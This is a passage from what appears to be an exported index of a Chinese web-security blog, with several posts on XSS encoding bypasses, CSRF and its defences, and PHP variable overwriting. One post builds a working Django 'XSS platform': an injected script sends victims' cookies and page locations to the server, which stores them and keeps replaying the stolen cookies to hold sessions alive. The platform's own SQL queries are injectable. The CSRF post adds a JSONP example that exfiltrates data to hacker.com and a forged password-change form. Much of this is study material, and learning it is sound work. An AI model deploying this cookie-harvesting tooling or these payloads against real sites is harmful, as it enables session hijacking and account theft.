#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt; 载荷1： HTML解析器解析a标签，将属性href的内容：%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29发送给URL编码器，URL编码器找到:的位置，但%6a%61%76%61%73%63%72%69%70%74协议不存在，故无法确定协议，默认为http协议。对整个内容进行url解码，得：javascript:alert(1)，最终的结果相当于，载荷无效 载荷2： HTML解析器在解析a标签，发现属性href的值内存在字符编码，将其转码为：javascript:%61%6c%65%72%74%28%32%29，将结果发送给URL解析器，URL解析器寻找:出现的位置，判断其协议，并将:后边内容进行URL转码，得到：alert(2)，由于是javascript协议，URL解析器将内容发送给JS解析器。载荷有效 载荷3： 同载荷1，由于找不到:，URL转码器按照默认http协议进行。结果相当于&lt;a href=&quot;http://javascript:alert(3)&quot;&gt;&lt;/a&gt; 载荷4： div属于常见元素中的一个，字符实体可以被成功解码，不过此时得到的是字符串型的数据，无法构成标签。 即：&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;中，=所代表的&lt;转码后得到的值为字符串型，无法被HTML解析器解析成构成的标签起始位的&lt;。若是&lt;div&gt;&lt;img src=x onerror=alert(4)&gt;&lt;/div&gt;的话是可以被成功解析的。 载荷5： Textarea属于RCDATA元素，无法执行js脚本，虽支持实体字符编码，但此时得到的值为字符串型，也不能被解析，但可正常显示。 载荷6： Textarea属于RCDATA元素，无法执行js脚本。 载荷7： 经HTML解析器解析，属性onclick的值confirm('7&amp;#39;);被Unicode解码得：confirm('7');由于是事件型属性，HTML编码器直接发送confirm('7');给JS解析器，载荷有效。 载荷8： 经HTML解析器解析，属性onclick的值 confirm('8\\u0027);由于是事件型属性，HTML编码器直接发送confirm('8\\u0027);给JS解析器，虽JS解析器支持Unicode解码，但该字符不为标识符(函数名/字符串常量)，载荷无效。 载荷9： script标签属于原始文本元素，不支持字符实体编码。载荷无效。 载荷10： script标签属于原始文本元素，HTML解析器直接将内容发送给JS解析器，JS解析器支持Unicode编码，且此处\\u0061\\u006c\\u0065\\u0072\\u0074(10);为alert(10)，属于函数名，满足标识符限制，故可解码得到alert(10)。载荷有效。 载荷11： \\u0028\\u0031\\u0031\\u0029 解码后不属于标识符，载荷无效。 载荷12： \\u0031\\u0032 解码后为整数型数字，不属于标识符，载荷无效。 载荷13： 同11 载荷14： 14\\u000a 解码后，属于字符串型，属于标识符，载荷有效。 载荷15: 1&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29; 经HTML实体解码得：1javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)经URL解码得：1javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(15)经Unicode解码得：alert(15)，载荷有效。 0x04 编码之外我们知道HTML解析器，在解析时会去掉一些干扰字符，如换行符、回车键、跳格键t等，故我们可以使用这个特性来绕开部分Filter 例子：123456789101112131415&lt;iframesrc=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; 0x05 参考资料: https://www.jianshu.com/p/c0dc4bbab8e8 https://blog.csdn.net/wh_xmy/article/details/79567070 https://www.w3.org/html/ig/zh/wiki/HTML5/syntax https://www.freebuf.com/articles/web/100675.html https://blog.csdn.net/dlmu2001/article/details/5998130 https://blog.csdn.net/wh_xmy/article/details/79567070 https://xz.aliyun.com/t/1556 https://security.yirendai.com/news/share/26 http://bobao.360.cn/learning/detail/292.html","link":"/2019/%E4%BB%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E6%9D%A5%E7%90%86%E8%A7%A3XSS%E8%BD%BD%E8%8D%B7%E7%9A%84%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2/"},{"title":"使用Django简单编写一个XSS平台","text":"1) 简要描述       原理十分简单2333,代码呆萌,大牛勿喷 &gt;_&lt; 2) 基础知识 XSS攻击基本原理和利用方法 Django框架的使用 3) Let’s start0x01       工欲善其事必先利其器，首先我们需要准备编写代码的各种工具和环境，这里不细说。我这里的环境和工具如下： python 3.7.0 pycharm windows 10 mysql 8.0.15 Django 2.1.3        需要用到的第三方库： django pymysql requests 0x02       我们先看一下XSS脚本是如何工作的 12var website=&quot;http://127.0.0.1&quot;;(function(){(new Image()).src=website+'/?keepsession=1&amp;location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&amp;opener='+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();        这段代码非常简单，就是通过javascript获取有用信息，然后通过访问xss平台将信息作为GET参数传给服务器。       注意：这里使用AJAX可能会出现CORS跨域问题。 0x03       先给出关键代码，其他都是Django相关的内容，这里不做相关讨论。123456789101112131415161718192021222324&quot;&quot;&quot;根据url值动态返回相应的javascript代码&quot;&quot;&quot;import pymysql,osfrom user.safeio import re_checkdef get_info(url): if not re_check(url,'num_letter'): return 'default' db = pymysql.connect('localhost','root','root','xss') cursor = db.cursor() cursor.execute(&quot;Select name From projects Where url='&quot;+url+&quot;'&quot;) js_name = cursor.fetchone()[0] if js_name == None: return 'default' else: return (js_name)def get_js_value(url): js_name = get_info(url) file = '\\\\script\\\\'+js_name + '.js' js_value = open(os.getcwd()+file).read() js_value = js_value.replace('&lt;-1234-&gt;',url) return js_value 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import pymysql,timefrom .getscript import get_infodef connect(): try: db = pymysql.connect('localhost', 'root', 'root', 'xss') cursor = db.cursor() return db,cursor except: print('连接数据库失败，正在尝试重新连接') connect()def put_letter(requests,url): now_time = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))[2:] if 'HTTP_X_FORWARDED_FOR' in requests.META: ip = requests.META['HTTP_X_FORWARDED_FOR'] else: try: ip = requests.META['REMOTE_ADDR'] except: ip = '0.0.0.0' ip = ip.replace(&quot;'&quot;,&quot;\\'&quot;) origin = requests.GET.get('location','Unknown').replace(&quot;'&quot;,&quot;\\'&quot;) software = requests.META.get('HTTP_USER_AGENT','Unknown').replace(&quot;'&quot;,&quot;\\'&quot;) method = requests.method.replace(&quot;'&quot;,&quot;\\'&quot;) data = requests.GET.get('cookie','No data').replace(&quot;'&quot;,&quot;\\'&quot;) keep_alive = requests.GET.get('keepsession','0').replace(&quot;'&quot;,&quot;\\'&quot;) list = [now_time,ip,origin,software,method,data,keep_alive] put_mysql(list,url)def put_mysql(list,url): db,cursor = connect() name = get_info(url) cursor.execute(&quot;Select user From projects Where url='&quot;+url+&quot;'&quot;) user = cursor.fetchone()[0] m_query = &quot;INSERT INTO letters(time,name,ip,origin,software,method,data,user,keep_alive) VALUES('{0}','{1}','{2}','{3}','{4}','{5}','{6}','{7}','{8}')&quot; m_query = m_query.format(list[0],name,list[1],list[2],list[3],list[4],list[5],user,list[6]) cursor.execute(m_query) db.commit() db.close()def get_letters(username): db, cursor = connect() m_query = &quot;SELECT * FROM letters WHERE user = '{}'&quot; m_query = m_query.format(username) cursor.execute(m_query) result_list = cursor.fetchall() return result_list        既然我们知道了xss脚本会将信息构造通过GET的参数形式传给XSS平台，我们只需在服务器接受数据并保存即可。 0x04       我们可以为我们的平台编写新的功能以完善我们的平台，如邮件提醒，cookie活性保持等1234567891011121314151617181920212223242526#coding=utf-8'''邮件发送'''import smtplibfrom email.mime.text import MIMETextfrom email.utils import formataddrmy_sender='xxxx'my_pass = 'xxxx'def send_mail(user_mail): try: print(user_mail) msg=MIMEText('您点的外卖已送达，请登录平台查询','plain','utf-8') msg['From']=formataddr([&quot;XSS平台&quot;,my_sender]) msg['To']=formataddr([&quot;顾客&quot;,user_mail]) msg['Subject']=&quot;您点的外卖已送达，请登录平台查询&quot; server=smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465) server.login(my_sender, my_pass) server.sendmail(my_sender,[user_mail,],msg.as_string()) server.quit() except Exception: pass 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970'''使用独立于主线程的其他线程来保持通用项目的cookie信息'活性'默认保持一个小时的活性'''import requests,queue,time,pymysqlCookie_Time = 1def decrease(time,number): if time &lt; number: time = '0'+str(time) else: time = str(time) return timedef count_time(now_time): global Cookie_Time year = int(now_time[0:2]) month = int(now_time[3:5]) day = int(now_time[6:8]) hours = int(now_time[9:11]) if hours &lt; Cookie_Time: if day == 1: if month == 1: month=12 year -= 1 else: day=30 month -= 1 else: day -= 1 hours += 19 else: hours -= 5 hours = decrease(hours,10) day = decrease(day,10) month = decrease(month,10) year = decrease(year,10) dec_time = (&quot;{0}-{1}-{2} {3}&quot;).format(year,month,day,hours) + now_time[11:] return dec_timedef create_queue(): Cookie_queue = queue.Queue() now_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))[2:] dec_time = count_time(now_time) m_query = (&quot;SELECT software,origin,data FROM letters WHERE name='default' and time&gt;'{}' and keep_alive = '1'&quot;).format(dec_time) db = pymysql.connect('127.0.0.1','root','root','xss') cursor = db.cursor() cursor.execute(m_query) return_list = cursor.fetchall() for x in return_list: Cookie_queue.put(x) return Cookie_queuedef action(): while True: time.sleep(60) task_queue = create_queue() while not task_queue.empty(): tasks = task_queue.get() url = tasks[1] ua = tasks[0] cookie = tasks[2] headers = {'User-Agent': ua, 'Cookie': cookie} try: requests.get(url, headers=headers) except: pass        注意这里需要使用独立于django主线程的子线程，比如我在manager.py里添加了这么一段代码：123456789101112import threadingfrom xssplatform.keep_alive import actionclass keep_Thread(threading.Thread): def __init__(self): super(keep_Thread,self).__init__() def run(self): action()if __name__ == '__main__': th = keep_Thread() th.start()短链接：123456789101112131415161718192021222324'''短链接生成接口c7.gg'''import requests,jsonHeaders = { &quot;accept&quot; : &quot;application/json, text/javascript, */*; q=0.01&quot;, &quot;accept-encoding&quot; : &quot;gzip, deflate, br&quot;, &quot;accept-language&quot; : &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;content-length&quot; : &quot;53&quot;, &quot;content-type&quot; : &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;origin&quot; : &quot;https://www.985.so&quot;, &quot;referer&quot; : &quot;https://www.985.so/&quot;, &quot;user-agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;,}def url_to_short(url): global Headers data = {'type':'c7','url':url} r = requests.post('https://create.ft12.com/done.php?m=index&amp;a=urlCreate',data=data,headers=Headers) list = json.loads(r.text) return list['list'] 4) 最后       其实看起来高大上的XSS平台原理就那么简单，真正难的部分是关于XSS跨站脚本的编写。       此项目已开源于Github，有任何问题可以提交issue，我会在第一时间进行回复。       我不会不断更新此项目，感兴趣的朋友可以多多关注我的博客。","link":"/2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/"},{"title":"关于我学XSS躺过的那些坑","text":"XSS字符编码在学习编码绕过时由于数量多，类型相似，不太容易记得住，记得全，故做此记录。 0x01 Html标签属性中执行简单了解： Html标签属性中的XSS问题多属于javascript伪协议常见的属性有： src lowsrc dynsrc url href action onload onunload onmouseover onerror 各种on开头的事件 PS：此处可不加括号，如onclick=javascript:alert(1),各类教程里常见的&lt;img src=javascript:alert(1)&gt;&lt;/img&gt;Chrome、Firfox已失效，IE测试成功。 在Html标签中，许多标签具有执行javascript的权利，当服务器存在过滤时，我们可以尝试通过以下编码方法绕过： 8/10/16进制转换([.][&amp;#][&amp;#x]) 利用javascript:String.fromCharCode(xx,xx,xx......) [xx为编码的字符串的ASCII码] JScript Encode [IE] JS fuck等 data:text/html;bbase64,xxxxxxx [IE下无效，Chorme、Firefox下均属于空白域，无法获取信息，不过可用作CVE攻击] 0x02 在&lt;script&gt;&lt;/script&gt;中 直接在script标签里执行的情况，我们通常分为以下几种利用方式： 直接导入远程XSS平台脚本 直接在&lt;&gt;&lt;/&gt;中写上自定义攻击脚本，如生成img标签 关于&lt;&gt;&lt;/&gt;中可用： 1) 单个拆开编码成ASCII1eval(String.fromCharCode()) 2) 使用eval()执行16进制转换后的代码12eval(\\u0064\\u0078......)eval(\\x64\\x78......) 0x03 在样式表中的编码样式表中可用expression和@import来执行js代码,此方法可进行适当的编码转换。PS:仅在IE8.0之前的版本。 1) expression12全角字符：&lt;div style=xss:ｅｘｐｒｅｓｓｉｏｎ(alert(1))&gt; 12十六进制&lt;div style=xss:\\0065ｘｐｒｅｓｓｉｏｎ(alert(1))&gt; 12/**/注释 [Javascript中也行]&lt;div sty/**/le=x/**/ss:\\0065ｘｐｒｅ/**/ｓｓｉｏ/**/ｎ(al/**/ert(1))&gt; 2) @import123\\和结束符\\0会被浏览器忽略@im\\po\\rt jav\\ascr\\ipt:al\\ert(1)@im\\00po\\0rt jav\\00asc\\0000ript:a\\00lert(1) 浏览器差异简单记录常见的浏览器差异造成的XSS 0x01 引号的差异只有IE支持反引号 ` 0x02 标签的差异 data协议执行代码是在Chrome下执行 Chrome下srcdoc利用：&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; IE下&lt;img src=javascript:alert(1)&gt; 只要火狐支持E4X 0x03 过滤器差异Chrome能拦截大多数反射型XSS，Firefox次之，IE最次 浏览器异常解析BUG产生XSS漏洞 关于调用document在刚开始学习XSS的时候总是想千方百计的想用javascript调用dom对象，比如document.cookie，却不知这个只能在javascript域[伪协议或标签内]范围内。 小知识点一、src等属性在引入时如果漏洞网站协议名于xss平台相同，即可省略去，如：&lt;img src=//www.baidu.com /&gt;二、svg标签属于xml而不属于html三、关于Cors跨域：使用Ajax跨域时默认是不允许带上会话数据的，不过可以在XSS平台通过设置返回的请求头Access-Control-Allow-Credentials: true，并且需要设置xhr的withCreadential属性值为true，注意此时返回的Access-Control-Allow-Origin不能设置为通配符true。四、优先级：function xxx(){}形式定义的函数 -&gt; == -&gt; &amp;五、使用img等合法标签跨域可以带上会话信息六、除javascript外还有vbscript、actionscript等七、P3P协议仅仅是IE浏览器支持,通常是Hacker域名通过iframe或script等载入存在XSS漏洞的网站 与CSRF的区别XSS的恶意请求伪造与CSRF极为相似，两者的差别为： 后者发出的伪造请求可为其他站点发出的，而前者都是存在XSS漏洞的站点发出的 CSRF是XSS无法替代的 CSRF可以无Javascript参与，及在黑客的网站上使用img等标签发送带Cookie(自带)的跨域请求。 关于XSS防御0x01 输出Html标签属性如：&lt;input class='xxx' value=&quot;{输出}&quot;&gt; 这里的输出如果过滤/转义了&quot;，便不存在XSS漏洞了，因为这里的value属性不能执行js代码。 0x02 输出在注释一定要过滤换行符！！ 0x03 输出在样式表过滤expression和@import还有外部图片的引用 0x04 字符集开头设定好字符集为 UTF-8 0x05 Cookie盗取设置好path、开启http_only、防止调试信息泄露和Apache400漏洞、使用Session","link":"/2019/%E5%85%B3%E4%BA%8E%E6%88%91%E5%AD%A6XSS%E8%BA%BA%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/"},{"title":"关于CSRF的那点事儿","text":"0x01 CSRF简介    CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。 0x02 CSRF原理    攻击者通过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。    CSRF漏洞产生的主要原因： 请求所有的参数均可确定 请求的审核不严格，如：只验证了Cookie 关于CSRF的执行过程，这里引用自hyddd大佬画的图：    我们知道，当我们使用img等标签时，通过设置标签的src等属性引入外部资源，是可以被浏览器认为是合法的跨域请求，也就是说是可以带上Cookie访问的。    试想一下，如果我们在a.com上放置一个img标签&lt;img src=//b.com/del?id=1&gt;。当b.com的用户在cookie没过期的情况下访问a.com，此时浏览器会向b.com发送一个指向http://b.com/del?id=1的GET请求，并且这个请求是带上Cookie的，而b.com的服务器仅仅是通过cookie进行权限判断，那么服务器就会进行相应的操作，比如假设此处为删除某个文章，用户在不知情的情况下便已完成操作。 0x03 CSRF能够造成的危害 篡改目标网站上的用户数据； 盗取用户隐私数据； 作为其他攻击向量的辅助攻击手法； 传播CSRF蠕虫。 0x04 CSRF的利用方式 通过HTML标签发送合法的跨域请求 通过Ajax发送请求（由于CORS机制的存在，一般不使用） 这里涉及到同源策略，如果不是很清楚可以先去了解一下。 1) HTML标签    我们知道，根据同源策略的规定，跨域请求是不允许带上Cookie等信息的，可是出于种种考虑最终没有进行完全禁止，即存在某些合法的跨域请求。    通常由HTML标签src、lowsrc等属性产生的跨域请求是被浏览器认为是合法的跨域请求，并且此时并不需要javascript的参与。    由HTML标签发出的合法跨域请求与正常的用户点击发出的请求相比所不同的是：两者请求头中的Referer值不同。    不过值得说明的是IE浏览器在面对这种情况时会判断本地Cookie是否带上P3P属性，如果仅仅是内存Cookie则不受此影响。    CSRF不仅仅只能针对GET请求，也可以针对POST请求，不过只能使用from标签进行自动提交，注意此处需用到javascript。 12345678910111213&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://a.com/changepass&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;victim&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;hacker&quot;&gt;&lt;input id=&quot;sub&quot; type=&quot;submit&quot;&gt; //可用样式表将按钮隐藏&lt;/form&gt; &lt;script&gt;document.getElementById(&quot;sub&quot;).click()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 2) Ajax    除了通过HTML标签发送跨域请求外，还可以通过Ajax来发送跨域情况，不过Ajax是严格遵守CORS规则的。    关于CORS规则，不清楚的可以去看看evoA大佬的一篇文章跨域方式及其产生的安全问题。    简单来说就是需要构造的xhr的withCredentials属性也为true才能带上Cookie进行跨域请求，与IE兼容性不好，且构造难度较Html复杂，故通常情况下我们不使用Ajax来进行CSRF攻击。    通常使用Ajax来跨域进行CSRF攻击的漏洞一般都配合XSS漏洞，此时的Ajax与目标域相同，不受CORS的限制。 0x05 CSRF利用实例1) 常用利用方式    攻击者构造恶意html，通过引诱用户/管理员访问，触发CSRF漏洞。 2) 结合XSS利用    CSRF+XSS结合，产生的危害已几何倍数剧增。如果CSRF和XSS两个漏洞是在同一个域下的话，那么此时的CSRF已经变成了OSRF了，即本站点请求伪造(出自黑客攻防技术宝典Web实战篇第二版p366)，此时已经变成XSS的请求伪造攻击，本文不在赘述。 3) jsonp    我们知道网站api返回的数据类型一般为json型或Array型，这里我们仅讨论json型。    当我们需要调用远程api时json返回的数据一般如下：1user({&quot;name&quot;:&quot;Yunen&quot;,&quot;work&quot;:&quot;Student&quot;,&quot;xxxx&quot;:&quot;xxxxxxxxx&quot;,......})    这是因为开发者如果需要调用远程服务器的api获取json数据，由于同源策略的限制，通过ajax获取就会显得比较麻烦，相比之下&lt;script&gt;标签的开放策略，无疑是最好的方法去弥补这一缺陷，使得json数据可以进行方便的跨域传输。此处的user为回调函数名，一般为某个请求参数值(比如：callback)，就上述例子说，只需要通过下面方法即可调用返回的数据：12345&lt;script&gt; function user(data){ console.log(data);//此时的json数据已经存储进了data变量中 }&lt;/script&gt;    这种远程api接口十分容易受到CSRF攻击，我们可以通过修改callback参数值并添加自定义函数，如： 123456789101112&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; function jsonphack(data){ new image().src=&quot;http://hacker.com/json.php?data=&quot;+escape(data); //将json返回的数据发送到黑客服务器上 }&lt;/script&gt;&lt;script src=&quot;http://127.0.0.1/1.php?callback=jsonphack&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4) 更多例子从零开始学CSRFWeb安全系列 – Csrf漏洞phpMyAdmin 4.7.x CSRF 漏洞利用 0x06 防御CSRF攻击    前边我们说到，产生CSRF的原因主要有两点，那么我们可以针对这两点进行相应的防御。 1) Token    我们知道CSRF攻击的请求除了Cookie以外，其他的内容必须提前确定好，那么如果我们在服务端要求提交的某一个参数中是随机的值呢？    这里我们称这个随机的、无法被预计的值叫做Token，一般是由服务端在接收到用户端请求后生成，返回给用户的Token通常放置在hidden表单或用户的Cookie里。    当用户打开正常的发送请求的页面时，服务器会生成一串随机的Token值给浏览器，在发送请求时带上此Token，服务端验证Token值，如果相匹配才执行相应的操作、销毁原Token以及生成并返回新的Token给用户，这样做不仅仅起到了防御CSRF的作用，还可以防止表单的重复提交。    由于HTML标签产生的合法跨域只能是单向请求，无法通过CSRF直接取返回的内容，所以我们无法使用CSRF先取Token值再构造请求，这使得Token可以起到防御CSRF的作用。    注意Token不应该放置在网页的Url中，如果放在Url中当浏览器自动访问外部资源，如img标签的src属性指向攻击者的服务器，Token会出现作为Referer发送给外部服务器，以下为相关实例： WooYun-2015-136903 2) Referer    前边我们提到，CSRF伪造的请求与用户正常的请求相比最大的区别就是请求头中的Referer值不同，使用我们可以根据这点来防御CSRF。    在接收请求的服务端判断请求的Referer头是否为正常的发送请求的页面，如果不是，则进行拦截。    不过此方法有时也存在着一定的漏洞，比如可绕过等，所以最好还是使用Token。    判断Referer的一般方法就是利用正则进行判断，而判断Referer的正则一定要写全，不然就会如上所说，可绕过！曾经的Wooyun上就有许多CSRF的漏洞是由于Referer的正则不规范导致。    比如^http\\:\\/\\/a\\.com，只验证了是否Referer是否以http://a.com开头，可是没想到我们可以在自己的顶级域名添加一个子域名http://a.com.hacker.com；还有http\\:\\/\\/a\\.com\\/，通过http://hacker.com/?http://a.com/绕过。以下相关例子均为Referer绕过： WooYun-2015-164067 WooYun-2015-165578 WooYun-2016-166608 WooYun-2016-167674     有些网站由于历史原因会允许空Referer头，当https向http进行跳转时，使用Html标签(如img、iframe)进行CSRF攻击时，请求头是不会带上Referer的，可以达到空Referer的目的。 3) 验证码    在发送请求前先需要输入基于服务端判断的验证码，机制与Token类似，防御CSRF效果非常好，不过此方法对用户的友好度很差。 4) 关注点    关于CSRF的防护应首先关注高危操作的请求，比如:网上转账、修改密码等，其次应重点关注那些可以散播的，比如：分享链接、发送消息等，再者是能辅助散播的，如取用户好友信息等，因为前者加上后者制造出来的CSRF蠕虫虽不如XSS蠕虫威力大，可是也不可小觑。最后应关注那些高权限账户能够进行的特权操作，如：上传文件、添加管理员，在许多渗透测试中，便是起初利用这点一撸到底。 5) 防御实例：Django的CSRF防御机制    新建个Django项目，打开项目下的settings.py文件，可以看到这么一行代码：django.middleware.csrf.CsrfViewMiddleware这个就是Django的CSRF防御机制，当我们发送POST请求时Django会自动检测CSRF_Token值是否正确。我们把Debug打开，可以看到如果我们的POST请求无CSRF_Token这个值，服务端会返回403报错。现在我们往表单上添加CSRF_Token的验证： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;/login/&quot; method=&quot;post&quot;&gt; {% raw %}{{% endraw %}% csrf_token %} //添加Token &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;pwd&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 下图为生成的HTML，可以看到{% csrf_token %}这串代码被Django解析成了一个隐藏的input标签，其中的值为token值，当我们发送请求时必须带上这个值。只有这样Django才会接受POST请求来的数据，否则返回错误，并且原登陆页面的CSRF_Token重新生成，上一个进行销毁，很大程度上防御住了POST请求的CSRF。 补充一张暴漫系列图，引用自先知社区《聊聊CSRF漏洞攻防—-久等的暴漫》作者：farmsec： 0x07 CSRF的常用检测方法1) 黑盒 首先肯定确定是否除Cookie外其他参数均可确定，即：无验证码，无Token等。 再者如果发现是Referer头判断的话，可以尝试是否可以绕过正则。 还有就是考虑能不能绕过Token，比如Url处的Token用加载攻击者服务器上的图片来获取。 最后可以考虑与XSS结合，如：攻击者使用iframe跨域，存在xss漏洞的网站插入的XSS执行代码为eval(window.name)，那么我们构造的iframe标签里可以添加个name属性与子页面进行通信，例子：wooyun-2015-089971。 2) 白盒 查看是否有Token，验证码，Referer等不确定参数判断。 判断Referer的正则是否安全。 判断Token返回的位置是否为安全位置。 判断生成的Token是否足够随机，毫无规律。 从上到下挖掘难度依次递增 0x08 补充说明1) HttpOnly    CSRF攻击不受Cookie的HttpOnly属性影响。 2) XSS漏洞情况下的CSRF    如果一个网站存在XSS漏洞，那么以上针对CSRF的防御几乎失去了作用。 3) 关于Flash的内容    鉴于Flash的凉势，这里暂不做研究以节省时间。 4) 目前CSRF形势    就目前而言，CSRF这个沉睡的巨人颇有一番苏醒的意味，可导致的危害也正在逐步的为人们所知，但目前仍有许多开发人员还没有足够的安全意识，以为只要验证Cookie就能确定用户的真实意图了，这就导致了目前仍有大量潜在的CSRF漏洞的局面，CSRF是不可小觑的漏洞，希望大家看完这篇文章能对CSRF有个较为清晰的认识。 0x09 结束语    这是我在信安之路投稿的第二篇文章，虽说内容较为基础，但也是我熟读几本相关书籍与相关文章、研究已知漏洞，所写出来的一篇半总结，半思考文章，也许里边会有些错误，麻烦各位表哥斧正，如果有想要与我交流相关内容的可以email我(asp-php#foxmail.com #换成@)。    最后欢迎大家多多投稿呀，真的能对自己的学习有很大帮助！ 0x0A 参考书籍：《Web前端黑客技术揭秘》p83-p96《XSS跨站脚本攻击剖析与防御》p182-p187《黑客攻防技术宝典Web实战篇第二版》p368-p374文章:CSRF漏洞挖掘WEB安全之Token浅谈跨域方式及其产生的安全问题Django中CSRF原理及应用详解CSRF简单介绍及利用方法 | WooYun知识库原生JSONP实现_动态加载js（利用script标签）","link":"/2019/%E5%85%B3%E4%BA%8ECSRF%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/"},{"title":"变量覆盖漏洞学习及在webshell中的运用","text":"一、发生条件：函数使用不当（$$、extract()、parse_str()、import_request_variables()等）开启全局变量 二、基础了解：1.$$定义$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。 举个简单例子： 变量a被定义成了字符串hello 而变量$a被定于成了字符串world!但同时$a本身也是个变量$$a就可以代表两个含义$($a)和$(hello) 两个变量此时输出的结果如图： 2.extract()定义extract()可以从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值语法结构：extract(array,extract_rules,prefix)i.array为必选参数（此参数必须为数组型数据）ii.extract_rules为可选参数，可选的值有：● EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。● EXTR_SKIP - 如果有冲突，不覆盖已有的变量。● EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。● EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。● EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。● EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。● EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。● EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。iii.prefix为可选参数（此参数暂不解释）举个例子： 在开头我们定义了一个数组d然后我们使用extract()函数并将array参数填写为数组d此时数组d中的键名将当做新的变量名来创建一个新的变量，而新的变量的值即为在数组中对应的值。（注意如果之前有声明过同一个变量,那么该变量将被覆盖。如果之后才声明将不会出现变量覆盖的现象）此时输出结果为： 